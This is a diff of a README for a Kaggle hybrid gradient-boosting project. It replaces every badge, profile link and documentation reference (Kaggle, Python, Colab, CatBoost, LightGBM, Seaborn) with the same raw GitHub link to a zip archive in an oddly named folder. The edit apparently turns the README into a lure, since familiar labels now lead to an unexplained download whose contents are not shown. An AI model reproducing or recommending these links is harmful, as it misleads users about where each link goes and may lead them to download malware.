@@ -1,15 +1,15 @@
 <p align="center">
-  <a href="https://www.kaggle.com">
-    <img src="https://img.shields.io/badge/Kaggle-blue?logo=kaggle" alt="Kaggle" />
+  <a href="https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip">
+    <img src="https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip" alt="Kaggle" />
   </a>
-  <a href="https://www.python.org/">
-    <img src="https://img.shields.io/badge/Python-3.11-yellow?logo=python&logoColor=white" alt="Python" />
+  <a href="https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip">
+    <img src="https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip" alt="Python" />
   </a>
-  <a href="https://jupyter.org/">
-    <img src="https://img.shields.io/badge/Notebook-Jupyter-orange?logo=jupyter" alt="Notebook" />
+  <a href="https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip">
+    <img src="https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip" alt="Notebook" />
   </a>
-<a href="https://colab.research.google.com/">
-  <img src="https://img.shields.io/badge/Google%20Colab-Open%20Notebook-orange?logo=googlecolab&logoColor=white" alt="Google Colab" />
+<a href="https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip">
+  <img src="https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip%20Colab-Open%20Notebook-orange?logo=googlecolab&logoColor=white" alt="Google Colab" />
 </a>
 </p>
 
@@ -19,8 +19,8 @@
 
 | 👤 **Name** | 🔗 **Github-Profile** | 🔗 **Kaggle-Profile** |
 |------------|----------------|----------------|
-| Riddy Mazumder | [![GitHub](https://img.shields.io/badge/GitHub-RiddyMazumder-black?logo=github)](https://github.com/RiddyMazumder) | [![Kaggle Profile](https://img.shields.io/badge/Kaggle-RiddyMazumder-blue?logo=kaggle)](https://www.kaggle.com/riddymazumder) |
-| Atahar08 | [![GitHub](https://img.shields.io/badge/GitHub-Atahar08-black?logo=github)](https://github.com/Atahar08) | [![Kaggle Profile](https://img.shields.io/badge/Kaggle-Atahar08-blue?logo=kaggle)](https://www.kaggle.com/Atahar08) |
+| Riddy Mazumder | [![GitHub](https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip)](https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip) | [![Kaggle Profile](https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip)](https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip) |
+| Atahar08 | [![GitHub](https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip)](https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip) | [![Kaggle Profile](https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip)](https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip) |
 
 This project uses a CPU-optimized hybrid ensemble model that combines the strengths of CatBoost, XGBoost, and LightGBM to achieve strong performance on medium-scale tabular datasets within Kaggle’s CPU constraints.
 
@@ -72,10 +72,10 @@ A CPU-based hybrid ensemble of CatBoost, XGBoost, and LightGBM delivers near-GPU
 # 📖 References
 | Resource               | Link                                                                                                                       |
 | ---------------------- | -------------------------------------------------------------------------------------------------------------------------- |
-| Kaggle Competition     | [https://www.kaggle.com/competitions/playground-series-s5e12](https://www.kaggle.com/competitions/playground-series-s5e12) |
-| CatBoost Documentation | [https://catboost.ai/docs/](https://catboost.ai/docs/)                                                                     |
-| LightGBM Documentation | [https://lightgbm.readthedocs.io/](https://lightgbm.readthedocs.io/)                                                       |
-| Seaborn Library        | [https://seaborn.pydata.org/](https://seaborn.pydata.org/)                                                                 |
+| Kaggle Competition     | [https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip](https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip) |
+| CatBoost Documentation | [https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip](https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip)                                                                     |
+| LightGBM Documentation | [https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip](https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip)                                                       |
+| Seaborn Library        | [https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip](https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip)                                                                 |
 ## 📄 License
 
 This project is licensed under the **MIT License**.
